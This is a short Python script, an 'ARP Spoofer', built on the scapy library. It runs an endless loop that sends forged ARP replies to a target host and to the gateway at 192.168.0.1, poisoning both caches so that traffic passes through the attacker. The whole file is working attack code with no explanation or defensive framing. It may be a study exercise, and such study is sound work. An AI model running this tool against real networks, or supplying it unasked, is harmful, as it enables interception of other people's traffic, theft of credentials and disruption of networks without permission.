import argparse
import sys
import time
import scapy.all as scapy
import signal

def def_handler(sig, frame):
    print("Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range  to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip,pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose = False)

def main():
    arguments = get_arguments()
    while True:
        spoof(arguments.ip_address, "192.168.0.1")
        spoof("192.168.0.1",arguments.ip_address)

        time.sleep(2)


if __name__ =='__main__':
    main()